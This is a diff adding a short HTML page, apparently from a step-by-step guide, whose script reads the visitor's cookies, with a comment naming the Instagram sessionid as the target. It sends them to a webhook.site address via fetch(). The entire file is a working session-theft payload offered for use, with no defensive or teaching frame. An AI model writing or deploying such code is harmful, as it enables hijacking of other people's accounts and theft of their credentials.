@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h3>Waiting for cookie...</h3>
+  <script>
+    // Get the Instagram sessionid cookie
+    var cookies = document.cookie;
+    
+    // Send it to your webhook (see Step 2)
+    fetch('https://webhook.site/3e1d7ad4-aef9-450f-bb8e-2a1287311964' + encodeURIComponent(cookies));
+  </script>
+</body>
+</html>
